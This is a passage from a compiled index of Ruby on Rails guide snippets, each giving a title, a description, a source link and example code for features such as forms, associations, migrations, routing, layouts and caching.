ruby\nCODE:\n```\n{\n  mailer: \"Notification\",\n  message_id: \"4f5b5491f1774_181b23fc3d4434d38138e5@mba.local.mail\",\n  subject: \"Rails Guides\",\n  to: [\"users@rails.com\", \"dhh@rails.com\"],\n  from: [\"me@rails.com\"],\n  date: Sat, 10 Mar 2012 14:18:09 +0100,\n  mail: \"...\", # omitted for brevity\n  perform_deliveries: true\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Output of form_with with Model\nDESCRIPTION: This snippet shows the HTML output generated by the form_with helper when bound to a model object.  The action is automatically set, and the field names are scoped with 'book[...]'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_17\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/books\" accept-charset=\"UTF-8\" method=\"post\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"ChwHeyegcpAFDdBvXvDuvbfW7yCA3e8gvhyieai7DhG28C3akh-dyuv-IBittsjPrIjETlQQvQJ91T77QQ8xWA\" autocomplete=\"off\">\n  <div>\n    <label for=\"book_title\">Title</label>\n    <input type=\"text\" name=\"book[title]\" id=\"book_title\">\n  </div>\n  <div>\n    <label for=\"book_author\">Author</label>\n    <input type=\"text\" name=\"book[author]\" id=\"book_author\">\n  </div>\n  <input type=\"submit\" name=\"commit\" value=\"Create Book\" data-disable-with=\"Create Book\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with image_tag Helper in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `image_tag` helper in Rails to generate an HTML `<img>` tag. It loads the image from the `public/images` directory and sets the `src` attribute of the `<img>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_53\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"header.png\" %>\n```\n\n----------------------------------------\n\nTITLE: Extracting Composite Key Parameters\nDESCRIPTION: Demonstrates extracting a composite key value from URL parameters using the `extract_value` method.  The example shows how to use this method to pass an array of values to ActiveRecord.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass BooksController < ApplicationController\n  def show\n    # Extract the composite ID value from URL parameters.\n    id = params.extract_value(:id)\n    @book = Book.find(id)\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/books/:id\", to: \"books#show\"\n```\n\n----------------------------------------\n\nTITLE: JavaScript Bundling Example\nDESCRIPTION: Example showing how multiple JavaScript files would be combined into a single application.js file through bundling. This demonstrates the concept of merging separate files to reduce HTTP requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_24\n\nLANGUAGE: javascript\nCODE:\n```\n// app/javascript/application.js\n// Contents of menu.js, cart.js, and checkout.js are combined here\n```\n\n----------------------------------------\n\nTITLE: Building Associated Objects in a Has and Belongs to Many Relationship in Rails\nDESCRIPTION: Example of using the build method to create a new assembly associated with a part, establishing the link through the join table without saving the new object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\n@assembly = @part.assemblies.build({ assembly_name: \"Transmission housing\" })\n```\n\n----------------------------------------\n\nTITLE: Basic Rails Template example\nDESCRIPTION: A simple example of a Rails template that generates a scaffold, adds a root route, and runs database migrations. It also includes an `after_bundle` block to initialize Git.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\n# template.rb\ngenerate(:scaffold, \"person name:string\")\nroute \"root to: 'people#index'\"\nrails_command(\"db:migrate\")\n\nafter_bundle do\n  git :init\n  git add: \".\"\n  git commit: %Q{ -m 'Initial commit' }\nend\n```\n\n----------------------------------------\n\nTITLE: Advanced Constraints - Custom Class (Ruby)\nDESCRIPTION: Defines a custom constraint using a class that responds to `matches?`.  The class checks if the request's remote IP is on a restricted list, routing to `RestrictedListController` if it is.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nclass RestrictedListConstraint\n  def initialize\n    @ips = RestrictedList.retrieve_ips\n  end\n\n  def matches?(request)\n    @ips.include?(request.remote_ip)\n  end\nend\n\nRails.application.routes.draw do\n  get \"*path\", to: \"restricted_list#index\",\n    constraints: RestrictedListConstraint.new\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for render_layout.action_view in Ruby\nDESCRIPTION: This snippet illustrates the payload structure for the `render_layout.action_view` event. The payload is a simple Ruby hash containing the `:identifier`, which holds the full path to the layout template being rendered.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  identifier: \"/Users/adam/projects/notifications/app/views/layouts/application.html.erb\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using create_join_table in Rails Migration\nDESCRIPTION: Shows a simplified approach to creating a join table using the create_join_table method in Rails migrations. This method automatically creates the appropriate join table structure for has_and_belongs_to_many associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_98\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAssembliesPartsJoinTable < ActiveRecord::Migration[8.1]\n  def change\n    create_join_table :assemblies, :parts do |t|\n      t.index :assembly_id\n      t.index :part_id\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering button with content using button_to helper in ERB\nDESCRIPTION: Demonstrates how the `button_to` helper renders a button with the specified content when `config.action_view.button_to_generates_button_tag` is set to `false`. The generated HTML will be an `<input>` tag inside a `<form>`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_54\n\nLANGUAGE: erb\nCODE:\n```\n<%= button_to \"Content\", \"/\" %>\n# => <input type=\"submit\" value=\"Content\">\n```\n\n----------------------------------------\n\nTITLE: Displaying Flash Notice (ERB)\nDESCRIPTION: This code snippet adds a `div` to the application layout to display flash messages (like notices) set by the controller. It utilizes the `<%= notice %>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_102\n\nLANGUAGE: erb\nCODE:\n```\n<html>\n  <!-- ... -->\n  <body>\n    <div class=\"notice\"><%= notice %></div>\n    <!-- ... -->\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Generated HTML Form\nDESCRIPTION: This snippet shows the HTML generated by the `form_with` helper when used with an `EmailContact` object. It demonstrates the structure of the form, including the input field for the `name` attribute.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/email_contacts\" method=\"post\">\n  <input type=\"text\" name=\"email_contact[name]\" id=\"email_contact_name\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Generating Image Tag with Path in Rails\nDESCRIPTION: This code snippet demonstrates how to use the `image_tag` helper with a specific path in Rails to generate an HTML `<img>` tag. It loads the image from the specified path relative to the `public/images` directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_54\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag \"icons/delete.gif\" %>\n```\n\n----------------------------------------\n\nTITLE: Using Initialize and Find Callbacks\nDESCRIPTION: Illustrates the output when using the after_initialize and after_find callbacks. The logs show the events triggered when creating a new user and finding a user from the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_20\n\nLANGUAGE: irb\nCODE:\n```\nirb> User.new\nYou have initialized an object!\n=> #<User id: nil>\n\nirb> User.first\nYou have found an object!\nYou have initialized an object!\n=> #<User id: 1>\n```\n\n----------------------------------------\n\nTITLE: Implementing Parameterized Mailers in Ruby on Rails\nDESCRIPTION: Demonstrates how to use parameterized mailers to share common setup and instance variables across mailer methods using before_action hooks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass InvitationsMailer < ApplicationMailer\n  before_action { @inviter, @invitee = params[:inviter], params[:invitee] }\n  before_action { @account = params[:inviter].account }\n\n  def account_invitation\n    mail subject: \"#{@inviter.name} invited you to their Basecamp (#{@account.name})\"\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nInvitationsMailer.with(inviter: person_a, invitee: person_b)\n                 .account_invitation.deliver_later\n```\n\n----------------------------------------\n\nTITLE: Adding a Foreign Key with Custom Column and Primary Key\nDESCRIPTION: This snippet demonstrates adding a foreign key with custom column and primary key names.  It adds a constraint to the `articles` table where the `reviewer` column references the `email` column in the `authors` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\nadd_foreign_key :articles, :authors, column: :reviewer, primary_key: :email\n```\n\n----------------------------------------\n\nTITLE: Registering Action Mailer Preview Interceptors in Ruby\nDESCRIPTION: This code snippet registers an interceptor, `MyPreviewMailInterceptor`, which will be called before mail is previewed. Interceptors are useful for modifying the mail message before it's displayed in a preview.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_mailer.preview_interceptors = [\"MyPreviewMailInterceptor\"]\n```\n\n----------------------------------------\n\nTITLE: Customizing Counter Cache Column Name in Rails Associations\nDESCRIPTION: Example showing how to specify a custom column name for the counter cache instead of using the default naming convention. This allows for more descriptive or legacy-compatible column names.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_139\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, counter_cache: :count_of_books\nend\n\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Checking if Zeitwerk Mode is Enabled - Ruby\nDESCRIPTION: Evaluates whether Zeitwerk mode is enabled in a Rails 7 (or compatible) application by returning a boolean. This can be used in application conditionals or diagnostics. No external dependencies are required beyond the Rails framework.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.zeitwerk_enabled?\n\n```\n\n----------------------------------------\n\nTITLE: HTML output of select box with option groups\nDESCRIPTION: This HTML code shows the select box generated with option groups for Europe and North America, with Chicago pre-selected.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_38\n\nLANGUAGE: html\nCODE:\n```\n<select name=\"city\" id=\"city\">\n  <optgroup label=\"Europe\">\n    <option value=\"BE\">Berlin</option>\n    <option value=\"MD\">Madrid</option>\n  </optgroup>\n  <optgroup label=\"North America\">\n    <option value=\"CHI\" selected=\"selected\">Chicago</option>\n  </optgroup>\n</select>\n```\n\n----------------------------------------\n\nTITLE: Enqueuing a job for immediate execution\nDESCRIPTION: This code enqueues the `GuestsCleanupJob` to be performed as soon as the queuing system is free. It uses the `perform_later` method, passing in the `guest` object as an argument to the job.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# Enqueue a job to be performed as soon as the queuing system is\n# free.\nGuestsCleanupJob.perform_later guest\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for expire_fragment.action_controller in Ruby\nDESCRIPTION: This snippet provides an example payload for the `expire_fragment.action_controller` notification event. It's a Ruby hash with a `:key` whose string value identifies the cache fragment being expired.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: 'posts/1-dashboard-view'\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Self-Join Relationships in Ruby on Rails Models\nDESCRIPTION: Defines an Employee model with self-referential associations for manager-subordinate relationships, showing how to implement hierarchical data within a single table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_67\n\nLANGUAGE: ruby\nCODE:\n```\nclass Employee < ApplicationRecord\n  # an employee can have many subordinates.\n  has_many :subordinates, class_name: \"Employee\", foreign_key: \"manager_id\"\n\n  # an employee can have one manager.\n  belongs_to :manager, class_name: \"Employee\", optional: true\nend\n```\n\n----------------------------------------\n\nTITLE: Template Inheritance in Rails\nDESCRIPTION: These snippets demonstrate how Rails looks for templates to render in its inheritance chain if a template or partial is not found in the conventional path. The example illustrates the controller inheritance chain for Admin::ProductsController, AdminController, and ApplicationController.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/application_controller.rb\nclass ApplicationController < ActionController::Base\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/admin_controller.rb\nclass AdminController < ApplicationController\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/admin/products_controller.rb\nclass Admin::ProductsController < AdminController\n  def index\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Relative Locale Lookup - ERB\nDESCRIPTION: This snippet demonstrates using a relative locale lookup in a Rails view. The `\".title\"` syntax tells Rails to use the controller and action names to construct the full translation key, making it more concise.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_91\n\nLANGUAGE: erb\nCODE:\n```\n<h1><%= t \".title\" %></h1>\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for Adding Counter Cache Column in Rails\nDESCRIPTION: Database migration that adds the books_count column to the authors table. This column stores the cached count of associated books for each author.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_138\n\nLANGUAGE: ruby\nCODE:\n```\nclass AddBooksCountToAuthors < ActiveRecord::Migration[8.1]\n  def change\n    add_column :authors, :books_count, :integer, default: 0, null: false\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rails Helper for Labeled Forms\nDESCRIPTION: This code snippet demonstrates how to create a helper method that applies the custom `LabellingFormBuilder` to forms automatically.  It defines a `labeled_form_with` method in `application_helper.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_66\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ApplicationHelper\n  def labeled_form_with(**options, &block)\n    options[:builder] = LabellingFormBuilder\n    form_with(**options, &block)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Helper in a Separate File\nDESCRIPTION: This code defines a helper module `MultipleAssertions` with a method `assert_multiple_of_forty_two`.  It provides an example of extracting helpers into separate files for better organization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\n# test/test_helpers/multiple_assertions.rb\nmodule MultipleAssertions\n  def assert_multiple_of_forty_two(number)\n    assert (number % 42 == 0), \"expected #{number} to be a multiple of 42\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Run a Specific Migration Up - Bash\nDESCRIPTION: This command executes the `change`, `up`, or `down` method for a specific migration version.  It checks if the migration exists and has already been executed. Requires a valid migration version number.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_67\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails db:migrate:up VERSION=20240428000000\n```\n\n----------------------------------------\n\nTITLE: Verifying Ruby Installation (bash)\nDESCRIPTION: Checks the installed Ruby version by running the `ruby` command with the `--version` flag in the terminal. This command confirms that Ruby is correctly installed and accessible in the system's PATH.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/install_ruby_on_rails.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ ruby --version\nruby 3.3.6\n```\n\n----------------------------------------\n\nTITLE: Setting Custom Database Resolver Middleware - Ruby\nDESCRIPTION: This code snippet configures Rails to use a custom context class 'MyCookieResolver' for ActiveRecord's database selector middleware. It builds upon previous middleware configuration, using cookies to track the context for database switching. Should be placed in a Rails config file after the custom resolver is defined.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.active_record.database_selector = { delay: 2.seconds }\nconfig.active_record.database_resolver = ActiveRecord::Middleware::DatabaseSelector::Resolver\nconfig.active_record.database_resolver_context = MyCookieResolver\n```\n\n----------------------------------------\n\nTITLE: Defining has_and_belongs_to_many Association in Rails Models\nDESCRIPTION: Shows how to define a has_and_belongs_to_many association between two Rails models. This example creates a many-to-many relationship between Assembly and Part models without an explicit join model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_96\n\nLANGUAGE: ruby\nCODE:\n```\nclass Assembly < ApplicationRecord\n  has_and_belongs_to_many :parts\nend\n\nclass Part < ApplicationRecord\n  has_and_belongs_to_many :assemblies\nend\n```\n\n----------------------------------------\n\nTITLE: Using ENV['DATABASE_URL'] in production.yml (Bash)\nDESCRIPTION: This Bash code demonstrates how to explicitly use the DATABASE_URL environment variable in the production configuration file (`config/database.yml`). This practice prevents committing sensitive database credentials to source control.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_85\n\nLANGUAGE: Bash\nCODE:\n```\n$ cat config/database.yml\nproduction:\n  url: <%= ENV['DATABASE_URL'] %>\n```\n\n----------------------------------------\n\nTITLE: Product Table Schema with User Reference (Ruby)\nDESCRIPTION: This is the resulting schema for the products table after adding the user reference.  It shows the user_id column and the index created on it.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_16\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table \"products\", force: :cascade do |t|\n    t.bigint \"user_id\", null: false\n    t.index [\"user_id\"], name: \"index_products_on_user_id\"\n  end\n```\n\n----------------------------------------\n\nTITLE: Example of Bad vs. Good Documentation Wording - Brevity\nDESCRIPTION: Demonstrates the difference between wordy documentation and concise, direct documentation. The example shows how to write clear, declarative sentences for API docs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# Caching may interfere with being able to see the results\n# of code changes.\n\n# GOOD\n# Caching interferes with seeing the results of code changes.\n```\n\n----------------------------------------\n\nTITLE: Configure File Update Checker for Rails\nDESCRIPTION: This snippet configures the `ActiveSupport::EventedFileUpdateChecker` to be used for detecting file updates in the file system. It requires the `listen` gem and demonstrates how to include it in the Gemfile for the development environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ngroup :development do\n  gem \"listen\", \"~> 3.5\"\nend\n```\n\n----------------------------------------\n\nTITLE: Collection Checkboxes using form builder\nDESCRIPTION: This snippet uses `collection_checkboxes` to render checkboxes for a `has_and_belongs_to_many` association, utilizing `Interest.order(:name)` as the collection, `:id` for the value, and `:name` for the label.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_56\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.collection_checkboxes :interest_ids, Interest.order(:name), :id, :name %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Nested Routes for Comments (Ruby)\nDESCRIPTION: Updates the engine's routes file (`config/routes.rb`) to define nested routes for comments within articles. This changes `resources :articles` to a block containing `resources :comments`, enabling routes like `/articles/:article_id/comments`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nresources :articles do\n  resources :comments\nend\n```\n\n----------------------------------------\n\nTITLE: Finding a record by attribute with find_by!\nDESCRIPTION: This example shows the use of `find_by!` which raises an exception when a matching record is not found. This is an alternative to `find_by` which returns `nil` when no record matches.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_37\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.find_by! first_name: 'does not exist'\nActiveRecord::RecordNotFound\n```\n\n----------------------------------------\n\nTITLE: Enabling/Disabling Development Cache in Rails\nDESCRIPTION: This snippet demonstrates how to enable and disable Action Controller caching in the development environment using the `bin/rails dev:cache` command. This command toggles the caching behavior for the Action Controller layer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_31\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails dev:cache\nDevelopment mode is now being cached.\n$ bin/rails dev:cache\nDevelopment mode is no longer being cached.\n```\n\n----------------------------------------\n\nTITLE: Rendering Partials in Rails\nDESCRIPTION: These snippets show how to render shared partials using ERB. The example shows how the index action in admin/products renders a partial named empty_list which is located in the app/views/application/ directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_31\n\nLANGUAGE: erb\nCODE:\n```\n<%# app/views/admin/products/index.html.erb %>\n<%= render @products || \"empty_list\" %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%# app/views/application/_empty_list.html.erb %>\nThere are no items in this list <em>yet</em>.\n```\n\n----------------------------------------\n\nTITLE: Pessimistic Locking with Existing Model Instance (Ruby)\nDESCRIPTION: This snippet demonstrates how to start a transaction and acquire the lock in one go using the `with_lock` method on an existing model instance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_136\n\nLANGUAGE: ruby\nCODE:\n```\nbook = Book.first\nbook.with_lock do\n  # This block is called within a transaction,\n  # book is already locked.\n  book.increment!(:views)\nend\n```\n\n----------------------------------------\n\nTITLE: Query Schema Migrations Table - IRB\nDESCRIPTION: This code snippet demonstrates how to access the Rails database console to query the `schema_migrations` table. This allows viewing which migrations have been applied to the database. Requires the database to be configured and accessible.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_71\n\nLANGUAGE: irb\nCODE:\n```\nrails dbconsole\n```\n\n----------------------------------------\n\nTITLE: Layout Inheritance in Rails\nDESCRIPTION: These snippets illustrate how layout declarations cascade downwards in the controller hierarchy, with more specific declarations overriding more general ones. This demonstrates the inheritance of layouts in ApplicationController, ArticlesController, SpecialArticlesController and OldArticlesController.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_29\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationController < ActionController::Base\n  layout \"main\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass ArticlesController < ApplicationController\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass SpecialArticlesController < ArticlesController\n  layout \"special\"\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass OldArticlesController < SpecialArticlesController\n  layout false\n\n  def show\n    @article = Article.find(params[:id])\n  end\n\n  def index\n    @old_articles = Article.older\n    render layout: \"old\"\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Implementing Rate Limiting in Rails Sessions Controller\nDESCRIPTION: This code snippet demonstrates how to enable rate limiting in a Rails sessions controller to mitigate brute-force attacks. It limits the number of requests to 10 within 3 minutes for the create action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\nclass SessionsController < ApplicationController\n  rate_limit to: 10, within: 3.minutes, only: :create\nend\n```\n\n----------------------------------------\n\nTITLE: Granular Database Connection Switching for Role\nDESCRIPTION: Example of granular database connection switching introduced in Rails 6.1, allowing switching connections for one database without affecting others. This example switches AnimalsRecord to reading role.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nAnimalsRecord.connected_to(role: :reading) do\n  Dog.first # Reads from animals_replica.\n  Person.first  # Reads from primary.\nend\n```\n\n----------------------------------------\n\nTITLE: Enabling Client-side Logging for Action Cable\nDESCRIPTION: This snippet shows how to enable client-side logging for Action Cable using JavaScript. By setting `ActionCable.logger.enabled` to `true`, debug information will be logged in the browser console, aiding in debugging client-side cable interactions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_30\n\nLANGUAGE: javascript\nCODE:\n```\nimport * as ActionCable from '@rails/actioncable'\n\nActionCable.logger.enabled = true\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic ActiveRecord Associations in Ruby on Rails\nDESCRIPTION: Basic model setup demonstrating the standard Rails association pattern between Book and Author models. This establishes a one-to-many relationship without any counter cache optimization.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_136\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n\nclass Author < ApplicationRecord\n  has_many :books\nend\n```\n\n----------------------------------------\n\nTITLE: Example Message Serializer Fallback Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for message_serializer_fallback.active_support event when a message serialization falls back to an alternative serializer, showing serialization details.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  serializer: :json_allow_marshal,\n  fallback: :marshal,\n  serialized: \"\\x04\\b{\\x06I\\\"\\nHello\\x06:\\x06ETI\\\"\\nWorld\\x06;\\x00T\",\n  deserialized: { \"Hello\" => \"World\" },\n}\n```\n\n----------------------------------------\n\nTITLE: Using readonly with belongs_to Association in ActiveRecord\nDESCRIPTION: Demonstrates how to use the readonly option with a belongs_to association to prevent modifications to the associated object through the association. Shows both the declaration and an example of how it prevents saving.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_121\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  belongs_to :author, -> { readonly }\nend\n```\n\n----------------------------------------\n\nTITLE: Using Yield in Layouts (Single Yield)\nDESCRIPTION: This code snippet demonstrates the simplest use of `yield` in a Rails layout. The entire contents of the view being rendered are inserted into the location of the `yield` statement.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_65\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n  </head>\n  <body>\n    <%= yield %>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Running Rails Tests via Command Line (All Tests)\nDESCRIPTION: This code snippet demonstrates how to execute all tests within a Rails application using the `bin/rails test` command. This command will run all tests located in the application's test directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test\n```\n\n----------------------------------------\n\nTITLE: Defining a Route with Static Segments - Ruby\nDESCRIPTION: This snippet defines a route with both dynamic and static segments. It matches paths like `/photos/1/with_user/2` and makes the `id` and `user_id` parameters available in the `params` hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos/:id/with_user/:user_id\", to: \"photos#show\"\n```\n\n----------------------------------------\n\nTITLE: HTML Output of fields_for Helper\nDESCRIPTION: This snippet shows the HTML output generated by the fields_for helper. Notice the names for the person and contact_detail fields.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_22\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/people\" accept-charset=\"UTF-8\" method=\"post\">\n  <input type=\"hidden\" name=\"authenticity_token\" value=\"...\" autocomplete=\"off\" />\n  <input type=\"text\" name=\"person[name]\" id=\"person_name\" />\n  <input type=\"text\" name=\"contact_detail[phone_number]\" id=\"contact_detail_phone_number\" />\n</form>\n```\n\n----------------------------------------\n\nTITLE: Generating Kindle Guides - Bash\nDESCRIPTION: Command to generate Rails guides specifically formatted for Kindle devices. Requires Rake, Bundler, and all regular dependencies for guide generation. Outputs Kindle-friendly files to the output directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake guides:generate:kindle\n```\n\n----------------------------------------\n\nTITLE: Range Condition with Time in Rails\nDESCRIPTION: This example shows how to use a range to find records created within a specific time period (yesterday in this case).  It leverages the `Time.now.midnight` to define the range boundaries.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(created_at: (Time.now.midnight - 1.day)..Time.now.midnight)\n```\n\n----------------------------------------\n\nTITLE: SQL query generated by unscoped.all and where in Rails\nDESCRIPTION: This SQL query is the result of the `Book.where(out_of_print: true).unscoped.all` command, which removes all scoping and retrieves all records from the `books` table with the condition `out_of_print: true`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_173\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.* FROM books\n```\n\n----------------------------------------\n\nTITLE: Reporting Unexpected Errors with Rails.error.unexpected in Ruby on Rails\nDESCRIPTION: Shows how to use Rails.error.unexpected for reporting errors that shouldn't occur under normal circumstances. The behavior differs between production and development environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/error_reporting.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ndef edit\n  if published?\n    Rails.error.unexpected(\"[BUG] Attempting to edit a published article, that shouldn't be possible\")\n    false\n  end\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Changing DateTime Components in Ruby\nDESCRIPTION: This snippet showcases the `change` method, which allows modification of specific components of a DateTime object, such as year, month, day, hour, min, sec, offset, and start. It returns a new DateTime object with the specified components updated. It also details how 